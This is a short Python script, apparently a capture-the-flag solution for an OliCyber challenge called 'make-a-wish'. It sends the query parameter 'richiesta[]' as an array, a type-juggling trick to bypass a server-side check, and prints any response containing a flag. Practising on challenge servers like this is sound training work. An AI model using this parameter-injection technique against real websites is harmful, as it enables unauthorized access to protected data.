import requests

url='http://make-a-wish.challs.olicyber.it'

r = requests.get(url, params={"richiesta[]":"exploit"}).text

for i in r.splitlines():
    if "flag{" in i.lower():
        print(r)